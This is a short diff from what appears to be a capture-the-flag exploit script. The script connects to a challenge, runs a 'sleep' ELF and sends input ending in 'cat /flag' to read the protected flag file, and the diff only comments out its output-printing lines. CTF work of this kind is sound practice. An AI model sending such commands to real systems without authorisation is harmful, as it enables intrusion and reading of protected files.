@@ -100,10 +100,10 @@ def main():
     run_elf(r, 0, "sleep")
     sleep(1)
     r.send("2\n0\ncat /flag\n")
-    print(r.recvline())
-    print(r.recvline())
-    print(r.recvline())
-    print(r.recvline())
+    # print(r.recvline())
+    # print(r.recvline())
+    # print(r.recvline())
+    # print(r.recvline())
     # for i in range(10):
     #     r.recvuntil("entering namespaces of pid 2")
     #     # if r.recvline() == b"chal: setresgid: Invalid argument":
